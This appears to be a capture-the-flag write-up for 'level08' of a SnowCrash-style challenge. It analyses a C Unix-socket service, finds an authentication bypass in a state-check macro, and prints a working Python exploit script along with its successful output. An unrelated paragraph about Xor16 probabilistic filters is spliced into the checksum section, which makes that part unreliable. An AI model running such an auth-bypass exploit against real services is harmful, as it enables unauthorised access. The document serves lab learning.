# Level 08

There is a C file and a binary in `/opt/snowcrash/level08`:

```bash
level08@snowcrash:~$ ls -l /opt/snowcrash/level08/
total 32
-rwxr-x--- 1 flag08 blacksun 17392 Jun  9 19:03 blacksun
-rw-r----- 1 root   level08  11736 Jun  9 19:03 blacksun.c
```

After checking the C file, we see that it is a network service running via a UNIX socket in `/run/blacksun/blacksun.sock`. The binary `blacksun` has SUID permissions under the user `flag08`.

## 1. C File Analysis

We check the C source code directly to map out the structure and requirements of the binary protocol.

### Step A: The Payload Requirements
The server expects an initial fixed-size header of 8 bytes, followed by a specific payload for the initialization command (`CMD_HELLO`):

```c
#define MAGIC_HELLO     0xDEADU

uint8_t raw[8];
if (read_exact(cfd, hdr.raw, sizeof(hdr.raw)) < 0)

uint16_t magic;
memcpy(&magic, payload, 2);
if (UNLIKELY(magic != MAGIC_HELLO))
```

From this, we know that the server expects a first message where the payload contains the `0xDEAD` magic number.

### Step B: The Checksum Verification
The code implements a custom (False) Fletcher-16 integrity check(do a XOR). Crucially, the checksum is **only verified when a payload is present** (`plen > 0`):

Probabilistic Filter (Xor16 Filter)
In software development and database management, an Xor16 filter is an immutable data structure used to test whether an element belongs to a set.

```c
        uint16_t checksum;        /* simple XOR-16 over payload      */
/* Fletcher-16 checksum variant */
compute_checksum(const uint8_t * restrict buf, uint32_t len)

        /* verify checksum when payload is present */
        if (plen > 0) {
            uint16_t got      = hdr.fields.checksum;
            uint16_t expected = compute_checksum(payload, plen);
            if (UNLIKELY(got != expected)) {
                handle_error(&ctx, "checksum mismatch");
                continue;
            }
        }
```

This checksum acts as security solely for payloads. It is required for the first command (`CMD_HELLO`) because it sends the `0xDEAD` magic bytes, but it will be ignored if we send a command with a length of `0`.

---

## 2. Structural Memory Mapping

The header is defined using a packed union/struct with bitfields:

```c
typedef union {
    uint8_t raw[8];
    struct {
        uint8_t  version : 3;
        uint8_t  state   : 2;
        uint8_t  cmd     : 3;
        uint32_t length;          /* payload length, little-endian  */
        uint16_t checksum;        /* simple XOR-16 over payload      */
    } __attribute__((packed)) fields;
} msg_header_t;
```

Because of `__attribute__((packed))`, there is no padding between the struct fields. The 8-byte layout must be constructed precisely as follows:
* **1 byte**: `version` (3 bits) + `state` (2 bits) + `cmd` (3 bits).
* **4 bytes**: `length` (uint32_t, little-endian).
* **2 bytes**: `checksum` (uint16_t).
* **1 byte**: Trailing padding (to fill the 8-byte buffer read by the server).

---

## 3. The Critical Flaw: Authentication Bypass

While examining the state constraints, we find a severe logic flaw in the `CHECK_STATE` macro:

```c
#define CHECK_STATE(ctx, required)                                      \
    ( ((required) == STATE_ADMIN)                                       \
        ? ((ctx)->state >= STATE_AUTH)                                  \
        : ((ctx)->state == (required)) )
```

When the server receives `CMD_ADMIN`, it validates access using `CHECK_STATE(&ctx, STATE_ADMIN)`. 
According to the macro's ternary logic:
1. Since `required == STATE_ADMIN`, it checks if `ctx->state >= STATE_AUTH`.
2. Successfully sending `CMD_HELLO` transitions the connection state to `STATE_AUTH` (`1`).
3. Since `1 >= 1` evaluates to true, the check passes.

This logic error allows us to skip the `CMD_AUTH` step entirely. We can request administrative access immediately after completing the initial handshake.
!! Thats the big mistake
---

## 4. Final Exploitation Script

Lets check where we gonna do the script to exploit the security failure
```bash
level08@snowcrash:/run/blacksun$ find / -writable -type d
find: ‘/run/udisks2’: Permission denied
/run/blacksun
```

We combine all our findings into a single Python automation script. Since the filesystem is mounted as read-only, we write and run the script inside `/run/blacksun` (Where the sock is created  ):

```bash
cd /run/blacksun/
cat << 'EOF' > exploit.py
import socket
import struct

SOCK_PATH = "/run/blacksun/blacksun.sock"

def compute_checksum(payload):
    acc = 0
    for i, b in enumerate(payload):
        acc ^= b ^ (i & 0xFF)
    return acc

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCK_PATH)

#       Hello CMD
payload_hello = struct.pack("<H", 0xDEAD) 
plen_hello = len(payload_hello)
checksum_hello = compute_checksum(payload_hello)

flags_hello = 1 | (0 << 5) # Version 1, CMD_HELLO (0)
header_hello = struct.pack("<B I H x", flags_hello, plen_hello, checksum_hello)

print("[*] Sending CMD_HELLO...")
s.sendall(header_hello + payload_hello)
print("[<-]", s.recv(1024).decode().strip()) # Expecting "HELLO OK"

#       ADMIN CMD
flags_admin = 1 | (2 << 5) # Version 1, CMD_ADMIN (2)
header_admin = struct.pack("<B I H x", flags_admin, 0, 0) # Length is 0, checksum is skipped

print("[*] Sending CMD_ADMIN (Exploiting CHECK_STATE)...")
s.sendall(header_admin)

response = s.recv(1024).decode()
print("[+] Server Response:\n", response)

s.close()
EOF
```

Nice it work ! Lets explain this script : 

```bash
import socket
import struct

SOCK_PATH = "/run/blacksun/blacksun.sock"

def compute_checksum(payload):
    acc = 0
    for i, b in enumerate(payload):
        acc ^= b ^ (i & 0xFF)
    return acc

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCK_PATH)
```
This part create the checksum (actually exactly the same as c file) for the first message and also connect the script to the Socket

```bash
payload_hello = struct.pack("<H", 0xDEAD) 
plen_hello = len(payload_hello)
checksum_hello = compute_checksum(payload_hello)

flags_hello = 1 | (0 << 5)

header_hello = struct.pack("<B I H x", flags_hello, plen_hello, checksum_hello)

print("[*] Sending CMD_HELLO...")
s.sendall(header_hello + payload_hello)
print("[<-]", s.recv(1024).decode().strip()) # Expecting "HELLO OK"
```

Ok now we send the first message , But before that we create the header using : MAGIC_HELLO, Payload len, Checksum.

Now if everything works fine we got : HELLO OK

Lets go with the second message :

```bash
flags_admin = 1 | (2 << 5) # Version 1, CMD_ADMIN (2)

header_admin = struct.pack("<B I H x", flags_admin, 0, 0) # Length is 0, checksum is skipped

print("[*] Sending CMD_ADMIN (Exploiting CHECK_STATE)...")
s.sendall(header_admin)

response = s.recv(1024).decode()
print("[+] Server Response:\n", response)

s.close()
```

Inside the C code, the binary reads the very first byte (1 byte = 8 bits) and expects it to hold two pieces of information at the same time:The Protocol Version, which must be 1.The Command ID, which for CMD_ADMIN is 2.To fit both numbers into a single byte, the developer used Bitfields (dividing 1 byte into smaller groups of bits). In memory, the layout of that first byte looks like this:
┌───────────────────────┬───────────────┬──────────────────────────┐
│ Command ID (3 bits)   │ State (2 bits)│ Protocol Version (3 bits)│
└───────────────────────┴───────────────┴──────────────────────────┘
      Bit 7 6 5             Bit 4 3             Bit 2 1 0

the number : 2 is in slots : 5, 6, and 7. So we do bitshifting 5 time to the left and we merge to get this :

  01000000  (Our shifted Command ID: 2 << 5)
+ 00000001  (Our Version: 1)
──────────
  01000001  (The final byte sent to the server)

then we sent it and we got the flag !! 

## 5. Flag Retrieval

```bash
level08@snowcrash:/dev/shm\$ python3 exploit.py
[*] Sending CMD_HELLO...
[<-] HELLO OK
[*] Sending CMD_ADMIN (Exploiting CHECK_STATE)...
[+] Server Response:
 ACCESS GRANTED
FLAG=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```
